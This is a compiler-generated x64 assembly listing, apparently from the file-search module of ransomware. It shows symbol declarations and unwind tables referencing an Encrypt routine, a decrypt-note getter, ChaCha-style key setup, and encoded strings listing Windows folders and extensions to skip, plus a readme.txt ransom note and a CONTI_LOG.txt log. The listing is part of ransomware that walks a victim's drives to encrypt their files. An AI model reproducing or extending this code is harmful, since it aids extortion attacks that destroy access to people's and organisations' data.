PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_C@_13BBDEGPLJ@?$AA?$CK@			; `string'
PUBLIC	??_C@_15PKPONJIK@?$AA?2?$AA?$CK@		; `string'
PUBLIC	??_C@_13FPGAJAPJ@?$AA?2@			; `string'
PUBLIC	??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@		; `string'
PUBLIC	??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@	; `string'
PUBLIC	??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@		; `string'
PUBLIC	??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@	; `string'
PUBLIC	??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@ ; `string'
PUBLIC	??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@ ; `string'
PUBLIC	??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@ ; `string'
PUBLIC	??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@		; `string'
PUBLIC	??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@ ; `string'
PUBLIC	??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@ ; `string'
PUBLIC	??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@ ; `string'
PUBLIC	??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@		; `string'
PUBLIC	??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@		; `string'
PUBLIC	??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@		; `string'
PUBLIC	??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@		; `string'
PUBLIC	??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@		; `string'
PUBLIC	??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@ ; `string'
PUBLIC	??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@ ; `string'
PUBLIC	??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@		; `string'
PUBLIC	??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_13JOFGPIOO@?$AA?4@			; `string'
PUBLIC	??_C@_15DDHGOCBH@?$AA?4?$AA?4@			; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	wcslen:PROC
EXTRN	free:PROC
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	?GetExtention@global@@YAPEA_WXZ:PROC		; global::GetExtention
EXTRN	?GetDecryptNote@global@@YAPEADXZ:PROC		; global::GetDecryptNote
EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?Write@logs@@YAXPEB_WZZ:PROC			; logs::Write
EXTRN	ECRYPT_keysetup:PROC
EXTRN	ECRYPT_ivsetup:PROC
EXTRN	ECRYPT_decrypt_bytes:PROC
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z:PROC ; cryptor::Encrypt
EXTRN	_CxxThrowException:PROC
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$RtlSecureZeroMemory DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$RtlSecureZeroMemory
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??2@YAPEAX_KPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$??2@YAPEAX_KPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max@?$numeric_limits@_J@std@@SA_JXZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?max@?$numeric_limits@_J@std@@SA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+116
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+96
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN11
	DD	imagerel $LN11+181
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$allocator@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??0?$allocator@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+93
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+84
	DD	imagerel $unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+71
	DD	imagerel $unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+82
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+143
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+117
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+144
	DD	imagerel $unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+128
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z DD imagerel $LN4
	DD	imagerel $LN4+519
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN5
	DD	imagerel $LN5+435
	DD	imagerel $unwind$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+169
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+87
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+301
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+232
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+226
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+271
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+196
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z DD imagerel $LN44
	DD	imagerel $LN44+1615
	DD	imagerel $unwind$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
